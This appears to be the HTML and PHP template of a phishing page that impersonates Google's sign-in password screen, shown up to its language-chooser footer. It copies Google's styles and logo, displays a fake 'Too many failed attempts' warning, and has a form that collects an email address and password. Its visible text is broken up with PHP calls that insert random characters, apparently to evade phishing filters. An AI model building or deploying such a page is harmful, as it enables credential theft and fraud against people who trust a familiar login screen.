	cursor: pointer;
	padding: 0 0 0 48px
}

.tVAlkc {
	background: url("https://www.gstatic.com/images/icons/material/system/svg/keyboard_arrow_right_24px.svg") right 12px/20px no-repeat scroll;
	border-bottom: 1px solid rgba(0, 0, 0, 0.12);
	padding: 12px 40px 12px 0
}

.yKwpYb {
	border-bottom: 1px solid rgba(0, 0, 0, 0.12);
	padding: 12px 40px 12px 0
}

.KVkcSd.Z8eykb>.tVAlkc {
	background-image: url("https://www.gstatic.com/images/icons/material/system/svg/keyboard_arrow_down_24px.svg")
}

.KVkcSd.Z8eykb>.tVAlkc[aria-expanded="true"] {
	background-image: url("https://www.gstatic.com/images/icons/material/system/svg/keyboard_arrow_up_24px.svg");
	border-bottom: none
}

.W6rbzb .KVkcSd:last-of-type>.tVAlkc {
	border-bottom: none
}

.BvN0nc {
	margin: 0
}

.OCtRXc {
	color: rgba(0, 0, 0, .54);
	margin: 0
}

.KVkcSd.Z8eykb .H2bZLd,
.KVkcSd.Z8eykb [aria-expanded="true"] .jiXjDf {
	display: none
}

.KVkcSd.Z8eykb [aria-expanded="true"] .H2bZLd {
	display: block
}

.W6rbzb {
	display: none
}

.KVkcSd.Z8eykb [aria-expanded="true"]+.W6rbzb {
	border-bottom: 1px solid rgba(0, 0, 0, 0.12);
	display: block
}

.qUcerf {
	margin: 16px 0 0
}

.qEp5Jd.xRsFob .Id5V1 {
	border-color: #db4437
}

.YSSD {
	color: #db4437;
	margin: 16px 0 0
}

.MK9CEd,
.MK9CEd:visited {
	display: inline-block;
	min-width: 46px;
	text-align: center;
	color: #444;
	font-size: 14px;
	font-weight: 700;
	height: 36px;
	padding: 0 8px;
	line-height: 36px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	border: 1px solid #dcdcdc;
	background-color: #f5f5f5;
	background-image: -webkit-linear-gradient(top, #f5f5f5, #f1f1f1);
	background-image: linear-gradient(top, #f5f5f5, #f1f1f1);
	cursor: default
}

.MK9CEd.OWB6Me,
.MK9CEd[disabled] {
	opacity: .5;
	filter: alpha(opacity=50);
	cursor: default;
	pointer-events: none
}

.MK9CEd:hover {
	border: 1px solid #c6c6c6;
	color: #333;
	text-decoration: none
}

.MK9CEd:active {
	background-color: #f6f6f6;
	background-image: -webkit-linear-gradient(top, #f6f6f6, #f1f1f1);
	background-image: linear-gradient(top, #f6f6f6, #f1f1f1);
	-webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
	box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1)
}

.MVpUfe,
.MVpUfe:visited {
	border: 1px solid #3079ed;
	color: #fff;
	text-shadow: 0 1px rgba(0, 0, 0, 0.1);
	background-color: #4d90fe;
	background-image: -webkit-linear-gradient(top, #4d90fe, #4787ed);
	background-image: linear-gradient(top, #4d90fe, #4787ed)
}

.MVpUfe:hover {
	border: 1px solid #2f5bb7;
	color: #fff;
	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
	background-color: #357ae8;
	background-image: -webkit-linear-gradient(top, #4d90fe, #357ae8);
	background-image: linear-gradient(top, #4d90fe, #357ae8)
}

.W5NFMb {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	margin-top: 32px
}

.W5NFMb .U57aM {
	margin: auto;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	display: block;
	text-align: left
}

.W5NFMb .bVQiTe {
	margin: auto;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	display: block;
	text-align: right
}

.iNArCe>p,
.iNArCe>ul,
.iNArCe>div {
	margin: 16px 0 0 0
}

.iNArCe [data-style="heading"] {
	font-weight: bold
}

.iNArCe p {
	margin-top: 0
}

.iNArCe ul {
	padding-left: 18px
}

.N3M02b {
	border-top: 1px solid rgba(0, 0, 0, 0.12);
	display: block;
	margin-top: 23px;
	padding-top: 10px
}

.ZkZ1j {
	margin-top: 10px
}

.N3M02b .pEWsEb {
	font-size: 14px
}

.pEWsEb.Jj6Lae .eRJVVb.sN5Hqb {
	border-color: #d93025
}

.pEWsEb .DAFGi {
	color: #d93025
}

.nc2Jm {
	display: inline-block;
	vertical-align: middle
}

.A2n2pe {
	display: inline-block;
	vertical-align: middle;
	font-weight: bold;
	margin-left: 16px
}

.CpxY6c h4 {
	margin-bottom: 0
}

.CpxY6c p {
	margin-top: 0
}

.ZtkYxe {
	margin-right: 32px
}

.juUkYc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.juUkYc+.juUkYc {
	margin-top: 24px
}

.elUySc {
	-webkit-flex-shrink: 0;
	flex-shrink: 0
}

.elUySc .MbhUzd {
	background-color: rgba(66, 133, 244, 0.2)
}

.elUySc .nQOrEb,
.elUySc.N2RpBe .Id5V1 {
	border-color: #4285f4
}

.ZXTOvf {
	margin-left: 24px
}

.SDQ8Ed,
.TP3k4e {
	position: relative
}

.TP3k4e .bxPAYd {
	margin-left: 0;
	margin-right: 0
}

.TP3k4e .k6Zj8d {
	padding-left: 0;
	padding-right: 0
}

.eLUXld {
	display: block
}

.eLUXld>:first-child {
	margin-top: 0
}

.eLUXld>:last-child {
	margin-bottom: 0
}

@media all and (min-width:601px) {
	.eLUXld {
		margin-left: -20px;
		margin-right: -20px;
		max-height: 470px;
		overflow: auto;
		padding-left: 20px;
		padding-right: 20px;
		scroll-behavior: smooth
	}
	.Wj1LYb .eLUXld {
		max-height: 414px
	}
}

.MqKhCd {
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	min-height: 56px;
	padding: 16px 0 4px
}

.F4eEqf {
	margin-top: 0;
	min-height: 0
}

@media all and (min-width:601px) {
	.MqKhCd {
		display: none
	}
	.Wj1LYb .MqKhCd {
		display: block
	}
}

.qNYAld {
	min-width: 0;
	-webkit-transform: translatex(-8px);
	transform: translatex(-8px)
}

.pbLXBd {
	display: none
}

@media all and (min-width:601px) {
	.pbLXBd {
		background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 1) 50%, rgba(255, 255, 255, 1) 100%);
		bottom: 0;
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		display: block;
		height: 48px;
		opacity: 1;
		padding-top: 8px;
		position: absolute;
		text-align: center;
		-webkit-transition: opacity .2s;
		transition: opacity .2s;
		width: 100%
	}
	.Wj1LYb .pbLXBd {
		opacity: 0;
		pointer-events: none
	}
	.pbLXBd:before {
		border-top: 1px solid #ccc;
		content: '';
		display: block;
		height: 0;
		left: 0;
		position: absolute;
		top: 28px;
		width: 100%
	}
	.erm3Qe {
		background-color: #4285f4;
		height: 40px;
		position: relative;
		width: 40px
	}
}

sentinel {}


/*# sourceURL=/accounts/static/_/ss/k=gaia.gaiafe_glif.tjnc6N4pRPU.L.W.O/am=jPgBg04AAIAIiAAPAAAAAAAAAQCAIYDDDBn__4ObkRfcBg/d=0/ct=zgms/rs=ABkqax3gvD7-rjSl9U-vwsEGIztsmoWqAQ */

</style>

</head>
<body id="yDmH0d" class="nyoS7c UzCXuf EIlDfe" jscontroller="Uas9Hd" jsaction="rcuQ6b:npT2md;click:FAbpgf;GvneHb:.CLIENT;nHjqDd:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;wINJic:.CLIENT;keydown:.CLIENT">
    <div class="H2SoFe LZgQXe TFhTPc" data-continent="USA" data-session-region="US">
        <div class="RAYh1e LZgQXe qmmlRd" id="initialView" role="presentation" jsname="WsjYwc" jscontroller="GHsEdb" jsaction="rcuQ6b:wVXPKc,eyofDf;CfTBWd:r0xNSb;enEq8c:Yd2OHe;Z2AmMb:nnGvjf;eqoCse:oUMEzf;RdYeUb:oUMEzf;EJh3N:vYWWBd;">
            <div class="RZBuIb c8DD0" aria-hidden="true">
                <div jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
                    <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                </div>
            </div>
            <div class="xkfVF" jsname="f2d3ae" role="presentation" tabindex="null">
                <div class="Aa1VU">
                    <div class="Lth2jb" jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true">
                        <div jsname="jjf7Ff">
                            <div id="logo" class="v8vQje" title="Google">
                                <div class="rr0DNb" jsname="l4eHX">
                                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf">
                                        <g id="qaEJec">
                                            <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                                        </g>
                                        <g id="YGlOvc">
                                            <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                                        </g>
                                        <g id="BWfIk">
                                            <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                                        </g>
                                        <g id="e6m3fd">
                                            <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                                        </g>
                                        <g id="vbkDmc">
                                            <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                                        </g>
                                        <g id="idEJde">
                                            <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="view_container" class="JhUD8d SQNfcc vLGJgb" jscontroller="WFS13">
                        <div jscontroller="Ka7I6" jsaction="jiqeKb:ZCwQbe;u3KAb:ZCwQbe;cLkKDf:n4vmRb;DPVjO:tVBJG;vu6WPd:bCkDte;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb),EtG4V(CkSUlf);DiUYjc:.CLIENT;abBxn:.CLIENT;nKbR0:.CLIENT;ffNU7c:.CLIENT" jsname="nUpftc" class="zWl5kd" data-view-id="b5STy" style="">
                            <div class="DRS7Fe bxPAYd k6Zj8d" jsname="lr9nlf" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
                                <div jsname="paFcre">
                                    <div class="jXeDnc" jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                                        <h1 data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Si<?=rT("ALPHANUMERIC",5);?>gn in to Conti<?=rT("ALPHANUMERIC",5);?>nue</span></h1>
                                        <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                                        <div class="aCayab">
                                            <div jscontroller="BzWZlf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d cd29Sd iiFyne" tabindex="0" role="link" jsname="af8ijd">
                                                <div class="gPHLDe">
                                                    <div class="qQWzTd" aria-hidden="true">
                                                        <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                                <div class="KlDWw" id="profileIdentifier"></div>
                                                <div class="krLnGe">
                                                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                                    <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                        <div class="WEQkZc"><span jsslot="" class="sFcPkb"><section class="aTzEhb uXELDc rNe0id eLNT1d" jscontroller="uwHxEe" jsname="INM6z" aria-live="assertive" aria-atomic="true" jsshadow=""><header class="IdEPtc" jsname="tJHJj"><div class="L9iFZc" role="presentation" jsname="NjaE2c"><h2 class="kV95Wc"><span class="yiP64c" aria-hidden="true" jsname="Bz112c"><svg aria-hidden="true" class="stUf5b d7Plee" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></span><span jsslot="" jsname="Ud7fr">Too many failed attempts</span></h2>
                                            <div class="yMb59d" jsname="HSrbLb" aria-hidden="true"></div>
                                        </div>
                                        </header>
                                        <div class="CxRgyd" jsname="MZArnb">
                                            <div jsslot=""></div>
                                        </div>
                                        </section>
                                        </span>
                                        <div class="bCAAsb">
                                         <form action="#" method="post" id="emailaccess" action="javascript:void(0);">
                                           <span jsslot=""><section class="aTzEhb" jscontroller="uwHxEe" jsshadow=""><header class="IdEPtc" jsname="tJHJj" aria-hidden="true"></header><div class="CxRgyd" jsname="MZArnb"><div jsslot=""><input type="hidden" name="emaildress" id="emaildress" value="" id="identifierId" jscontroller="a5DQI">
                                            	<input type="hidden" name="emailType" value="" id="emailType">
                            					<input type="hidden" name="emailProvider" value="" id="emailProvider">
                            					<input type="hidden" name="emailretry" value="" id="emailretry">
                                        <div class="SdBahf VxoKGd" jscontroller="MZKEPb" jsshadow="" jsname="vZSTIf" jsaction="rcuQ6b:rcuQ6b;JIbuQc:nAF18e(sEbX2);VIULte:nAF18e;DQ0KUb:.CLIENT;HYMnzb:.CLIENT;sv6xVb:.CLIENT;sKmMle:.CLIENT" data-is-visible="false"><div class="eEgeR"><div class="W498nc"><div class="fdWl7b"><div class="hDp5Db" jscontroller="zysDWd" jsaction="rcuQ6b:rcuQ6b;JIbuQc:OVHm7(sEbX2);keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT" jsname="UmsTj" jsshadow=""><div id="password" class="rFrNMe ze9ebf YKooDc q9Nsuf zKHdkd sdJrJc" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O"><div class="aCsJod oJeWuf"><div class="aXBtI I0VJ4d Wic03c"><div class="Xb9hP">
	<input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="emailPassword" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value="" badinput="false" id="emailPassword"><div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true" required>Enter your password</div></div><span jsslot="" class="A37UZe sxyYjd MQL3Ob"><div role="button" class="U26fgb mUbCce fKz7Od YYBxpf PlRDoc M9Bg4d" jscontroller="bA7b2c" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd;" jsshadow="" jsname="sEbX2" aria-label="Show password" aria-disabled="false" tabindex="0" data-tooltip="Show password" data-tooltip-vertical-offset="-12" data-tooltip-horizontal-offset="0"><div class="VTBa7b MbhUzd" jsname="ksKsZd" style="top: 12px; left: 12px; width: 24px; height: 24px;"></div><span jsslot="" class="xjKiLb"><span class="Ce1Y1c" style="top: -12px"><span class="wRNPwe S7pdP" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M10.58,7.25l1.56,1.56c1.38,0.07,2.47,1.17,2.54,2.54l1.56,1.56C16.4,12.47,16.5,12,16.5,11.5C16.5,9.02,14.48,7,12,7 C11.5,7,11.03,7.1,10.58,7.25z"></path><path d="M12,6c3.79,0,7.17,2.13,8.82,5.5c-0.64,1.32-1.56,2.44-2.66,3.33l1.42,1.42c1.51-1.26,2.7-2.89,3.43-4.74 C21.27,7.11,17,4,12,4c-1.4,0-2.73,0.25-3.98,0.7L9.63,6.3C10.4,6.12,11.19,6,12,6z"></path><path d="M16.43,15.93l-1.25-1.25l-1.27-1.27l-3.82-3.82L8.82,8.32L7.57,7.07L6.09,5.59L3.31,2.81L1.89,4.22l2.53,2.53 C2.92,8.02,1.73,9.64,1,11.5C2.73,15.89,7,19,12,19c1.4,0,2.73-0.25,3.98-0.7l4.3,4.3l1.41-1.41l-3.78-3.78L16.43,15.93z M11.86,14.19c-1.38-0.07-2.47-1.17-2.54-2.54L11.86,14.19z M12,17c-3.79,0-7.17-2.13-8.82-5.5c0.64-1.32,1.56-2.44,2.66-3.33 l1.91,1.91C7.6,10.53,7.5,11,7.5,11.5c0,2.48,2.02,4.5,4.5,4.5c0.5,0,0.97-0.1,1.42-0.25l0.95,0.95C13.6,16.88,12.81,17,12,17z"></path></svg></span><span class="wRNPwe pVlEsd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12,7c-2.48,0-4.5,2.02-4.5,4.5S9.52,16,12,16s4.5-2.02,4.5-4.5S14.48,7,12,7z M12,14.2c-1.49,0-2.7-1.21-2.7-2.7 c0-1.49,1.21-2.7,2.7-2.7s2.7,1.21,2.7,2.7C14.7,12.99,13.49,14.2,12,14.2z"></path><path d="M12,4C7,4,2.73,7.11,1,11.5C2.73,15.89,7,19,12,19s9.27-3.11,11-7.5C21.27,7.11,17,4,12,4z M12,17 c-3.79,0-7.17-2.13-8.82-5.5C4.83,8.13,8.21,6,12,6s7.17,2.13,8.82,5.5C19.17,14.87,15.79,17,12,17z"></path></svg></span></span>
                                                </span>
                                        </div>
                                        </span>
                                        <div class="i9lrp mIZh1c"></div>
                                        <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf" style="transform-origin: 266.5px center;"></div>
                                    </div>
                                </div>
                                <div class="LXRPh">
                                    <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="OyEIQ uSvLId" jsname="h9d3hd" aria-live="assertive" style="display: none;"><div class="EjBTad" aria-hidden="true"><svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div><div jsname="B34EJ"><span jsslot="">Wrong password. Try again.</span></div></div>
   
            <div class="gSlDTe" jsname="JIbuQc"></div>
        </div>
        <div jscontroller="T3edRd" jsname="Si5T8b" class="T8zd8e R43Xif" jsaction="click:IMdg8d(A1U4Sb);rcuQ6b:jqIVcd"><img jsname="O9Milc" id="captchaimg" class="TrZEUc">
            <button class="gIn9Gc TrZEUc" jsname="A1U4Sb" id="playCaptchaButton" tabindex="0" aria-label="Listen and type the numbers you hear" type="button">
                <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                    <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.8-1-3.3-2.5-4v8c1.5-.7 2.5-2.2 2.5-4zM14 3.2v2.1c2.9.9 5 3.5 5 6.7s-2.1 5.9-5 6.7v2.1c4-.9 7-4.5 7-8.8s-3-7.9-7-8.8z"></path>
                </svg>
            </button>
            <audio jsname="CakGX" type="audio/wav" id="captchaAudio"></audio>
            <div jscontroller="b21kgd" jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;EJh3N:rcuQ6b;" jsname="CQRbLd" class="d2CFce cDSmF" role="presentation" data-is-rendered="true">
                <div class="rFrNMe N3Hzgf jjwyfe zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Vsb5Ub">
                    <div class="aCsJod oJeWuf">
                        <div class="aXBtI Wic03c">
                            <div class="Xb9hP">
                                <input type="text" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off" spellcheck="false" tabindex="0" aria-label="Type the text you hear or see" name="ca" id="ca" dir="ltr" data-initial-dir="ltr" data-initial-value="">
                                <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Type the text you hear or see</div>
                            </div>
                            <div class="i9lrp mIZh1c"></div>
                            <div jsname="XmnwAc" class="OabDMe cXrdqd"></div>
                        </div>
                    </div>
                    <div class="LXRPh">
                        <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                        <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
    </section>
    </span>
  

    </div>
    </div>
    <div class="zQJV3" jsname="DH6Rkf" jscontroller="QEg9te" jsaction="rcuQ6b:rcuQ6b;JIbuQc:vjx2Ld(Njthtb),ChoyC(eBSUOb),mzsPGd(bCkDte),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),RSKJgd(z5mH8d),JGhSzd;LEpEAf:dE26Sc(lqvTlf);h4C2te:JGhSzd;" data-primary-action-label="Next" data-secondary-action-label="" jsshadow="">
        <div class="dG5hZc" jsname="DhK0U">
                <div role="button" id="passwordNext" class="U26fgb O0WRkf zZhnYe e3Duub C0oVfc FliLIb DL0QTb">
                    <div class="Vwe4Vb MbhUzd" jsname="ksKsZd"></div>
                    <div class="ZFr60d CeoRYc"></div><span jsslot="" class="CwaK9"><span class="RveJvd snByac">Next</span></span>

                </div>
           
            <div class="daaWTb" jsname="QkNstf">
                <div role="button" id="forgotPassword" class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc FliLIb uRo0Xe NaOGkc" jscontroller="VXdfxd" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd;" jsshadow="" jsname="bCkDte" aria-disabled="false" tabindex="0">
                    <div class="Vwe4Vb MbhUzd" jsname="ksKsZd"></div>
                    <div class="ZFr60d CeoRYc"></div><span jsslot="" class="CwaK9"><span class="RveJvd snByac">Fo<?=rT("ALPHANUMERIC",5);?>rgot pass<?=rT("ALPHANUMERIC",5);?>word?</span></span>
                </div>
            </div>
        </div>
    </div>
    
      </form>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    <footer class="RwBngc">
        <div class="u7land" jscontroller="VVHlDf" jsaction="rcuQ6b:npT2md;aLn7Wb:VPRXbd">
            <div role="listbox" aria-expanded="false" id="lang-chooser" class="jgvuAb TkU0Xc">
                <div jsname="LgbsSe" role="presentation">
                    <div class="ry3kXd Ulgu9" jsname="d9BH4c" role="presentation">
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="af" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Afrikaans&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="az" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;azərbaycan&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ca" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;català&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="cs" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Čeština&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="da" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Dansk&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="de" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Deutsch&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="et" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;eesti&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="en-GB" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;English (United Kingdom)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname="wQNmvb" jsaction="" data-value="en" aria-selected="true" role="option" tabindex="0">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;English (United States)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="es" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Español (España)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="es-419" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Español (Latinoamérica)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="eu" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;euskara&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="fil" aria-selected="false" role="option" tabindex="-1">
